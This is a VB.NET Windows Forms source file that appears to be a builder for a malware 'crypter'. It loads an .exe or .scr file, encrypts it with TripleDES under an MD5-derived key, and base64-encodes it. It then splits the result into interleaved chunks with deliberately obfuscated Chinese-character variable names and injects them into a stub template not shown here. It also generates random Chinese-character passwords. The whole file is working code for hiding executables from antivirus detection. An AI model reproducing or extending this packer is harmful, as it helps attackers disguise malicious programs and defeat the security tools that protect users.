﻿Imports System.Text
Imports System.IO
Imports System.IO.Compression
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography

Public Class Form1

    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        Dim OMAR As New OpenFileDialog
        OMAR.Filter = ("Executable |*.exe|SCR|*.scr|All Files|*.*")
        OMAR.Title = "Add File"
        OMAR.ShowDialog()
        TextBox1.Text = OMAR.FileName
    End Sub

    Private Sub FlatButton2_Click(sender As Object, e As EventArgs) Handles FlatButton2.Click
        Dim os As String = NumericUpDown1.Value
        If (Me.pwd.Text = "") Then

        End If
        If (Not String.IsNullOrEmpty(TextBox1.Text)) Then
            Dim azert As String = Convert.ToBase64String(Form1.Md5Encrypt(File.ReadAllBytes(Me.TextBox1.Text), Me.pwd.Text, CipherMode.ECB, PaddingMode.PKCS7))
            Dim rty As String = azert.Length
            Dim osx As String = rty / os
            Dim kerkoz As Integer
            Dim oiuy As String
            Dim fsdfs As String = ""
            Dim dfhdfhdf As String = "谢伟吸乓年仰英伏天吸英份信道说你天英劳式天是不个英信方会是动想常"
            For 动是字年方非种方个感天式个个方方年中英说个感想谢谢涯字天表是频天 As Integer = 1 To os
                For lop = 0 To rty - 1 Step +os
                    oiuy += Mid(azert, lop + 动是字年方非种方个感天式个个方方年中英说个感想谢谢涯字天表是频天, 1)
                Next
                Dim ertyuio As String = 动是字年方非种方个感天式个个方方年中英说个感想谢谢涯字天表是频天
                dfhdfhdf = dfhdfhdf + " & Strings.Mid(种方动式动吸不答方劳不英丢个个语语仰是英英不天表动那的语吸天是伟伟动语个方谢自的词动年语英是问涯劳自动词动表动份自非年不方份天自词涯个不动答吸谢个肉谢英天谢劳是感" + ertyuio + ", 动是字年方非种方个感天式个个方方年中英说个感想谢谢涯字天表是频天, 1)"
                fsdfs = fsdfs + "dim 种方动式动吸不答方劳不英丢个个语语仰是英英不天表动那的语吸天是伟伟动语个方谢自的词动年语英是问涯劳自动词动表动份自非年不方份天自词涯个不动答吸谢个肉谢英天谢劳是感" + ertyuio + " as string= """ + oiuy + """" + ChrW(10)
                oiuy = ""
            Next
            RichTextBox1.Text = My.Resources.stub.Replace("चअठटनघफऑटएऑचञषनठअबडञदटषछऔदकऔखआ", fsdfs).Replace("写作者惯常用各种修辞手法曲折传达自己的见解和情", dfhdfhdf)


        End If
    End Sub
    Public Shared Function Md5Encrypt(ByVal bytData As Byte(), ByVal sKey As String, Optional ByVal tMode As CipherMode = 2, Optional ByVal tPadding As PaddingMode = 2) As Byte()
        Dim provider As New MD5CryptoServiceProvider
        Dim buffer As Byte() = provider.ComputeHash(Encoding.UTF8.GetBytes(sKey))
        provider.Clear()
        Dim provider2 As New TripleDESCryptoServiceProvider With { _
            .Key = buffer, _
            .Mode = tMode, _
            .Padding = tPadding _
        }
        Dim buffer2 As Byte() = provider2.CreateEncryptor.TransformFinalBlock(bytData, 0, bytData.Length)
        provider2.Clear()
        Return buffer2
    End Function
    Private Sub FlatButton4_Click(sender As Object, e As EventArgs) Handles FlatButton4.Click
        Me.RichTextBox1.SelectAll()
        Me.RichTextBox1.Copy()
    End Sub

    Private Sub FlatButton5_Click(sender As Object, e As EventArgs) Handles FlatButton5.Click
        Me.RichTextBox1.SelectAll()
        Me.RichTextBox1.Clear()
    End Sub

    Private Sub FlatButton3_Click(sender As Object, e As EventArgs) Handles FlatButton3.Click
        Form2.Show()
    End Sub

    Private Sub FlatButton6_Click(sender As Object, e As EventArgs) Handles FlatButton6.Click
        pwd.Text = omar1(NumericUpDown1.Value)
    End Sub
    Public Function omar1(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "那个想感动会常英是谢道不伟谢你伏词方是天是种方份乓常劳乓吸天会谢语天问动是肉那说道会动的说乓动那不个肉乓的动动个份那仰".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
End Class
